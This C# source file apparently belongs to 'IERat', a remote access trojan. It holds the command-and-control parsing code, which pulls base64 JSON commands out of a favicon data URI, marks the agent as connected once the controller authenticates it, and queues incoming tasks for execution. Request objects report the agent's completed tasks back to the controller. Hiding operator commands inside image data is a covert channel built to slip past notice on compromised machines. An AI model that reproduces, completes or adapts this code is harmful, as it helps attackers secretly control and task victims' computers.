using System;
using System.Collections.Generic;
using System.Text.Json;

namespace IERat.lib
{
    public class Utils
    {
        public static void ParseTask(string favicon)
        {
            try
            {
                favicon = favicon.Split(new string[] { "data:image/x-icon;base64," }, StringSplitOptions.None)[1];
                string ResponseObjectJSON = Base64Decode(favicon);
                ResponseObject responseObject = JsonSerializer.Deserialize<ResponseObject>(ResponseObjectJSON);
                if (responseObject.Type == "NewAgent") { 
                    if (responseObject.Notes == "Authenticated")
                    {
                        //Console.WriteLine("Authenticated Successfully");
                        IERat.channel.Status = "Connected";
                    } 
                }

                else if ((responseObject.Type == "NewTask") && (responseObject.Task != null))
                {
                    IERat.channel.agent.AgentTasks.Enqueue(responseObject.Task);
                }
            }
            catch
            {
                Console.WriteLine("parsing failed");
            }
        }
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
    }

    public class ResponseObject
    {
        public ResponseObject()
        {
            Type = "NewTask"; // FilePart, NewAgent
            Task = new TaskObject();
        }
        public string Type { get; set; }
        public Guid AgentID { get; set; }
        public TaskObject Task { get; set; }
        public string Notes { get; set; }

        public string ToJSON()
        {
            return JsonSerializer.Serialize(this);
        }
    }
    public class RequestObject
    {
        public RequestObject(Guid ID)
        {
            AgentID = ID;
            CompletedTasks = new List<TaskObject>();
        }
        public Guid AgentID { get; set; }
        public List<TaskObject> CompletedTasks { get; set; }
        public string ToJSON()
        {
            return JsonSerializer.Serialize(this);
        }
    }
}
